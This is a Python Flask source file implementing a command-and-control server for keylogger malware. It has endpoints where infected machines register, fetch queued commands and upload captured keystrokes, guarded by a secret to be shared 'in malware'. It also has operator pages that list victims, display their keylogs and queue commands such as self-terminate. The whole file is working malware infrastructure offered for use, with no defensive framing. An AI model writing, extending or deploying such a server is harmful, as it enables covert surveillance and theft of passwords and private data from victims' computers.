# server.py
from importlib import import_module

try:                           # running via  `flask run`  ⇒  package context
    from . import db
except ImportError:            # running via  `python server.py`  or tests
    db = import_module("db")

from flask import Flask, request, jsonify, render_template_string, send_file
import os, threading, time, io

SHARED_SECRET = os.getenv("C2_SECRET", "changeme")      # <— put same value in malware


app = Flask(__name__)

# ─── simple auth decorator ─────────────────────────────────────────────────
def require_secret(func):
    from functools import wraps
    @wraps(func)
    def wrapper(*a, **kw):
        if request.headers.get("X-API-KEY") != SHARED_SECRET:
            return jsonify(error="unauthorised"), 401
        return func(*a, **kw)
    return wrapper

# ─── Malware-facing ────────────────────────────────────────────────────
@app.post("/register")
@require_secret
def register():
    data = request.get_json(force=True, silent=True) or request.form
    cid  = data.get("id")
    if not cid:
        return jsonify(error="missing id"), 400

    db.upsert_client(cid, data.get("os","unknown"), data.get("arch","unknown"))
    return jsonify(ok=True), 201 

@app.get("/command")
@require_secret
def command():
    cid = request.args.get("id")
    if not cid:
        return jsonify(error="missing id"), 400
    cmd = db.pop_command(cid)          # returns None if no queued cmd
    return jsonify(cmd=cmd or "")

# upload keylog (raw bytes, e.g. multipart or direct POST)
@app.post("/upload")
@require_secret
def upload():
    cid = request.headers.get("X-CLIENT-ID") or request.form.get("id")
    if not cid:
        return jsonify(error="missing id"), 400
    if "file" in request.files:
        raw = request.files["file"].read()
    else:
        raw = request.get_data()              # fallback for raw POST
    if not raw:
        return jsonify(error="empty payload"), 400
    db.store_log(cid, raw)
    return jsonify(ok=True)

# ─── Operator-facing ─────────────────────────────────────────────────────────
@app.get("/clients")
def list_clients():
    rows = db.fetch_clients()
    html = """
    <style>
      .active   {background:#c8f7c5;}
      .inactive {background:#e0e0e0;}
    </style>
    <h1>Clients</h1><table border=1 cellpadding=5>
      <tr><th>ID</th><th>OS</th><th>Arch</th><th>Status</th><th>Last Seen (UTC)</th></tr>
      {% for r in rows %}
        <tr class="{{r.status}}">
          <td><a href='/logs/{{r.id}}'>{{r.id}}</a></td>
          <td>{{r.os}}</td><td>{{r.arch}}</td>
          <td>{{r.status}}</td><td>{{r.last_seen}}</td>
        </tr>
      {% endfor %}
    </table>"""
    return render_template_string(html, rows=rows)

@app.get("/logs/<cid>")
def view_logs(cid):
    logs = db.fetch_logs(cid)
    if not logs:
        return f"<h2>No logs for {cid}</h2>", 404
    html = """
    <h1>Keylogs for {{cid}}</h1>
    
    <div style="margin-bottom: 20px;">
      <button onclick="queueCommand('{{cid}}', 'slp 10')">Sleep 10s</button>
      <button onclick="queueCommand('{{cid}}', 'shd')">Self Terminate</button>
      <button onclick="queueCommand('{{cid}}', 'pwn')">Show Prank Message</button>
    </div>
    
    <div id="command-status" style="color: green; margin-bottom: 15px;"></div>
    
    {% for ts,txt in logs %}
      <h3>{{ts}}</h3>
      <pre style='white-space:pre-wrap;border:1px solid #ccc;padding:4px;'>{{txt}}</pre>
    {% endfor %}
    
    <script>
      async function queueCommand(id, cmd) {
        const formData = new FormData();
        formData.append('id', id);
        formData.append('cmd', cmd);
        
        try {
          const response = await fetch('/commands', {
            method: 'POST',
            body: formData
          });
          
          const result = await response.json();
          if(result.ok) {
            document.getElementById('command-status').innerText = `Command '${cmd}' queued successfully!`;
            setTimeout(() => {
              document.getElementById('command-status').innerText = '';
            }, 3000);
          } else {
            document.getElementById('command-status').innerText = `Error: ${result.error}`;
            document.getElementById('command-status').style.color = 'red';
          }
        } catch (error) {
          document.getElementById('command-status').innerText = `Error: ${error.message}`;
          document.getElementById('command-status').style.color = 'red';
        }
      }
    </script>
    """
    return render_template_string(html, cid=cid, logs=logs)

@app.post("/commands")
def queue_cmd():
    cid = request.form.get("id")
    cmd = request.form.get("cmd")
    if not cid or not cmd:
        return jsonify(error="need id & cmd"), 400
    db.queue_command(cid, cmd)
    return jsonify(ok=True)


if __name__ == "__main__":
    # background sweeper
    def sweeper():
        while True:
            db.mark_stale()
            time.sleep(30)
    threading.Thread(target=sweeper, daemon=True).start()

    app.run(debug=True,ssl_context=("cert.pem", "key.pem")) # https

